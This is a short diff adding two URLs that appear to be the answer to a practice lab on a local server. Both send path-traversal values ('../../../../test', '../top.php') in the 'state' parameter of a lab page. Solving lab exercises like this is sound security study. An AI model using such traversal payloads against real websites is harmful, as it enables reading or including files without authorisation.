@@ -1,0 +1,5 @@
+http://127.0.0.1/Labs/5/case-1/index.php?state=../../../../test&submit=submit
+
+or :
+
+/Labs/5/case-1/index.php?state=../top.php&submit=submit
